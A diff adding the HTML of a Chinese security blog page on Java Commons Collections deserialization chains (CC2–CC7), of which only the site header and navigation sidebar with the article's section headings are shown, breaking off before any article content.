@@ -1,0 +1,2589 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Longlone's Blog about daily and security.">
+      
+      
+      
+        <link rel="canonical" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/">
+      
+      <link rel="icon" href="../../../../attachment/favicon.ico">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.8">
+    
+    
+      
+        <title>反序列化CC篇补充 - Longlone's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6e60f8b8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#7e56c2">
+        
+      
+    
+    
+    
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#反序列化cc篇补充" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../.." title="Longlone&#39;s Blog" class="md-header__button md-logo" aria-label="Longlone's Blog" data-md-component="logo">
+      
+  <img src="../../../../attachment/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Longlone's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              反序列化CC篇补充
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Longlone&#39;s Blog" class="md-nav__button md-logo" aria-label="Longlone's Blog" data-md-component="logo">
+      
+  <img src="../../../../attachment/logo.svg" alt="logo">
+
+    </a>
+    Longlone's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/" class="md-nav__link">
+        友情链接
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1">
+          Golang
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Golang" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Golang
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+        第一章-Golang基础
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/" class="md-nav__link">
+        第三章-HTTP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/" class="md-nav__link">
+        第二章-网络连接
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/" class="md-nav__link">
+        第五章-DNS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="md-nav__link">
+        第四章-HTTP服务器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2">
+          Java
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          Java
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_1">
+          JavaWeb安全 文章复现
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="JavaWeb安全 文章复现" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          JavaWeb安全 文章复现
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" class="md-nav__link">
+        ClassLoader类加载机制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" class="md-nav__link">
+        java文件系统
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/" class="md-nav__link">
+        JDBC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/" class="md-nav__link">
+        Unsafe
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/" class="md-nav__link">
+        java IO/NIO多种读写文件方式
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        java 文件名空字节截断漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" class="md-nav__link">
+        java反射机制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        java本地命令执行
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/" class="md-nav__link">
+        开头声明
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_2" type="checkbox" id="__nav_3_2_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_2">
+          Java安全漫谈 文章复现
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java安全漫谈 文章复现" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Java安全漫谈 文章复现
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RMI%E7%AF%871/" class="md-nav__link">
+        RMI篇1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RMI%E7%AF%872/" class="md-nav__link">
+        RMI篇2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RMI%E7%AF%873/" class="md-nav__link">
+        RMI篇3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%B0%84%E7%AF%871/" class="md-nav__link">
+        反射篇1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%B0%84%E7%AF%872/" class="md-nav__link">
+        反射篇2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%B0%84%E7%AF%873/" class="md-nav__link">
+        反射篇3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        反序列化CC篇总结
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          反序列化CC篇补充
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        反序列化CC篇补充
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cc2" class="md-nav__link">
+    CC2
+  </a>
+  
+    <nav class="md-nav" aria-label="CC2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#入口" class="md-nav__link">
+    入口
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#priorityqueue关键代码" class="md-nav__link">
+    PriorityQueue关键代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#transformingcomparator关键代码" class="md-nav__link">
+    TransformingComparator关键代码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#初始版本的poc" class="md-nav__link">
+    初始版本的poc
+  </a>
+  
+    <nav class="md-nav" aria-label="初始版本的poc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#poc" class="md-nav__link">
+    poc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#调用逻辑" class="md-nav__link">
+    调用逻辑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#另外一个版本的poc" class="md-nav__link">
+    另外一个版本的poc
+  </a>
+  
+    <nav class="md-nav" aria-label="另外一个版本的poc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#javassit" class="md-nav__link">
+    javassit
+  </a>
+  
+    <nav class="md-nav" aria-label="javassit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#maven依赖" class="md-nav__link">
+    maven依赖
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#简单使用" class="md-nav__link">
+    简单使用
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poc_1" class="md-nav__link">
+    poc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#调用逻辑_1" class="md-nav__link">
+    调用逻辑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cc3" class="md-nav__link">
+    CC3
+  </a>
+  
+    <nav class="md-nav" aria-label="CC3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#调用逻辑_2" class="md-nav__link">
+    调用逻辑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cc4" class="md-nav__link">
+    CC4
+  </a>
+  
+    <nav class="md-nav" aria-label="CC4">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#调用逻辑_3" class="md-nav__link">
+    调用逻辑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cc5" class="md-nav__link">
+    CC5
+  </a>
+  
+    <nav class="md-nav" aria-label="CC5">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#入口_1" class="md-nav__link">
+    入口
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#最终poc" class="md-nav__link">
+    最终poc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#调用逻辑_4" class="md-nav__link">
+    调用逻辑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cc7" class="md-nav__link">
+    CC7
+  </a>
+  
+    <nav class="md-nav" aria-label="CC7">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#入口_2" class="md-nav__link">
+    入口
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#最终poc_1" class="md-nav__link">
+    最终poc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#调用逻辑_5" class="md-nav__link">
+    调用逻辑
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/" class="md-nav__link">
+        反序列化之CommonsBeanUtils1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/" class="md-nav__link">
+        反序列化之RMI
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/" class="md-nav__link">
+        反序列化之fastjson
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/" class="md-nav__link">
+        反序列化篇1
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/" class="md-nav__link">
+        反序列化篇2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%873/" class="md-nav__link">
+        反序列化篇3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%874/" class="md-nav__link">
+        反序列化篇4
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%875/" class="md-nav__link">
+        反序列化篇5
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%876/" class="md-nav__link">
+        反序列化篇6
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/" class="md-nav__link">
+        反序列化篇之JDK7u21
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/" class="md-nav__link">
+        反序列化篇之JDK8u20
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%BC%80%E5%A4%B4%E5%A3%B0%E6%98%8E/" class="md-nav__link">
+        开头声明
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_3">
+          Java安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Java安全" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Java安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../java%E5%AE%89%E5%85%A8/JNDI/" class="md-nav__link">
+        JNDI与JNDI注入
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_4" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_4">
+          Spring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Spring" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          Spring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/AOP/" class="md-nav__link">
+        AOP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/" class="md-nav__link">
+        Bean的作用域
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/" class="md-nav__link">
+        Bean的装配
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/HelloSpring/" class="md-nav__link">
+        HelloSpring
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+        Spring中使用java代码配置
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+        Spring中使用注解配置
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+        Spring使用XML配置
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+        Spring简介
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/" class="md-nav__link">
+        代理模式
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/" class="md-nav__link">
+        依赖注入(DI)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/" class="md-nav__link">
+        控制反转(IOC)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_5" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_5" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_5">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_5">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Cookie/" class="md-nav__link">
+        Cookie
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Exercise/" class="md-nav__link">
+        Exercise
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Filter/" class="md-nav__link">
+        Filter
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HelloServlet/" class="md-nav__link">
+        HelloServlet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HttpServletRequest/" class="md-nav__link">
+        HttpServletRequest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HttpServletResponse/" class="md-nav__link">
+        HttpServletResponse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/JSP/" class="md-nav__link">
+        JSP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
